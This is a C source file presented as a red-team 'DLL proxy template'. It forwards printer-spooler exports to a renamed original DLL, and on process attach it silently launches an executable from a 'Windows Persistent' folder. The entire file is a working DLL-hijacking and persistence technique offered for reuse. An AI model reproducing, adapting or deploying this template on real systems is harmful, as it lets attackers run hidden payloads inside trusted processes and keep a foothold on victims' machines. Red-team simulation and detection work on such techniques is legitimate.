/*

 Red Team Simulation template
 DLL proxy template
 
 Author: Shaikh Jamal Uddin (Linkedin: https://www.linkedin.com/in/engrjamal/)

*/
#pragma comment(linker,"/export:OpenPrinterA=winsplhlp.OpenPrinterA,@143")
#pragma comment(linker,"/export:ClosePrinter=winsplhlp.ClosePrinterA,@29")
#pragma comment(linker,"/export:DocumentPropertiesA=winsplhlp.DocumentPropertiesA,@77")

#include <Windows.h>

void Go(void) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

        CreateProcess(
					"c:\\Windows Persistent\\Embed\\embed.exe", 
					"", NULL, NULL, TRUE, 0, NULL, NULL, 
					&info, &processInfo);
	
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		Go();
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
